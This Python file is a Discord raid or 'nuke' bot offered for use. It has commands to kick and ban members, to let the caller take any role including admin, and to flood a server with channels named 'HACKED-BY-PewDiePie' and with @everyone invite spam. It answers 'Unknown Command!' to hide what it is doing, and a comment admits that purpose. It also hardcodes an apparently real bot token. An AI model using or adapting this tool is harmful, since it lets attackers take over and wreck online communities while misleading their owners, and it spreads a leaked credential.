import discord
from discord.ext.commands import bot
from discord.ext import commands
import random
import asyncio
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get
 
 
bot = commands.Bot(command_prefix='!')
 
@bot.event
async def on_ready():
    print("BOT ACTIVATED!")
    print("Join my discord! https://discord.gg/tb6pa")
    print("Subscribe me! https://www.youtube.com/c/AhmadWahelsa?sub_confirmation=1")
    print("Bot name: " + bot.user.name)
    print("commands :")
    print("!k : !k (user)")
    print("!b : !b (user)")
    print("!s : spam on a channel")
    print("!r : !r (role name) u can use this to give yourself admin")
    print("!c : channel spam")
    print('discord version: ' + discord.__version__)
 
@bot.command(pass_context = True)
async def k(ctx, userName: discord.User):
    await bot.kick(userName)
 
@bot.command(pass_context = True)
async def b(ctx, userName: discord.User):
    await bot.ban(userName)
 
@bot.command(pass_context=True)
async def r(ctx, user: discord.User, role: discord.Role):
    await bot.add_roles(ctx.message.author, role)  

 
@bot.command(pass_context=True)
async def c(ctx):
    await bot.say("Unknown Command!") #idk ignore this just to make sure some people that this bot isnt dangerous
    time.sleep(2)
    for i in range (0,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
        await bot.create_channel(ctx.message.server, 'HACKED-BY-PewDiePie', type=discord.ChannelType.text)
        await bot.say("@everyone Join Group: https://discord.gg/QqgJ5X")
        await bot.say(" @everyone Join Group: https://discord.gg/QqgJ5X")
        await bot.create_channel(ctx.message.server, 'DISCORD-HAS-NUKED', type=discord.ChannelType.text)
        await bot.say("@everyone Join Group: https://discord.gg/QqgJ5X")
        await bot.say("@everyone Join Group: https://discord.gg/QqgJ5X")
 
@bot.command(pass_context=True)
async def s(ctx):
    await bot.say("Unknown Command!") #idk ignore this just to make sure some people that this bot isnt dangerous
    time.sleep(2)
    for i in range (0,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
        await bot.say("@everyone SERVER NOOB") #text 1 goes here
        await bot.say("@everyone SERVER NOOB") #text 2 goes here

 
 
bot.run ("NTU0NTQ2NzY5NTgxNzAzMTkw.D2eNgw.N7KDGNwltlJ7C-NANH6ni3D-VD0") #your bot token (please dont use your discord account token otherwise your account will get banned maybe)